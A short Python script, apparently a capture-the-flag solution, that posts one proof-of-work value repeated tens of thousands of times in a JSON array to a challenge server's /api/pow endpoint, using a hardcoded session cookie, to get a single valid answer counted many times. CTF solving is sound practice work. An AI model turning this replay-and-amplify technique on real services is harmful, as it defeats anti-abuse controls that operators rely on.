import requests
import json

def create_pay(data, payload):
    for i in range(0, 10000):
        payload.append(data)
    return payload


data = "52592778"
payload = []
target_url = "https://web-pow-lz56g6.wanictf.org/api/pow"
target_header = {
    "Cookie":"pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiIzY2UwZDY1Ny1kMzNhLTQxMTYtYjcwMC04MjdlOGE2ZTlmOTEifQ.TSTLPNgIrQGeTUNVpvTG0TEZUaqIsmFRghBTHI5f7c4",
    "Content-Length":"2",
    "Sec-Ch-Ua":"'Chromium';v='121', 'Not A(Brand';v='99'",
    "Sec-Ch-Ua-Platform":"Linux"
    }
for i in range(0, 8):
    payload = create_pay(data, payload)

# payload = json.dumps(payload)
    # print(payload)
    exploit = requests.post(url=target_url, json=payload, headers=target_header)
    print(exploit.text)